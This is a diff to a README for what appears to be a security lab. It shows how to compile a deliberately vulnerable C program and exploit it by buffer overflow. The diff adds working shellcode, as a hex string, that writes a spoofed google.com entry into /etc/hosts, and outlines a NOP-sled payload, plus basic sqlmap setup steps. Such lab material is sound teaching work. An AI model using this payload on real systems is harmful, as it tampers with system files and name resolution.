@@ -11,6 +11,7 @@ This Lab aims to exploit a buffer overflow vulnerability to attack and modify th
 *First, Create a text file named `Lab1.c` containing the vulnerable c code:*<br>
 
 <img width="500" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/Lab1.png?raw=true"><br>
+
 *Then: Compile the vulnerable C program using the following command "gcc -g Lab1.c -o Lab1.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2"*<br>
 
 ```sh
@@ -37,3 +38,33 @@ ld -o shellcode shellcode.o
 for i in $(objdump -d shellcode |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
 ``` 
 - We will get the hex code as shown
+
+<img width="1000" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/Hex.png?raw=true"><br>
+
+```sh
+\x31\xc9\xf7\xe1\xb0\x05\x51\x68\x6f\x73\x74\x73\x68\x2f\x2f\x2f\x68\x68\x2f\x65\x74\x63\x89\xe3\x66\xb9\x01\x04\xcd\x80\x93\x6a\x04\x58\xeb\x10\x59\x6a\x14\x5a\xcd\x80\x6a\x06\x58\xcd\x80\x6a\x01\x58\xcd\x80\xe8\xeb\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d
+``` 
+*Next, Create Payload*<br>
+We will create a payload to overflow the buffer and inject shellcode. Payload includes:
+- NOP sled (NOP command sequence to ensure safe jumping into shellcode).
+- Shellcode (the code we just extracted).
+- Buffer address (memory address containing shellcode).
+
+
+# Task 2: SQLMAP
+- Start docker container from SQLi. 
+- Install sqlmap.
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
+*Step1, Run the following command to download sqlmap from GitHub:*<br>
+```sh
+git clone https://github.com/sqlmapproject/sqlmap.git
+``` 
+*Step2, Go into the sqlmap folder:*<br>
+```sh
+cd sqlmap
+``` 
+*Step3, Run sqlmap*<br>
+```sh
+python sqlmap.py
+``` 
+
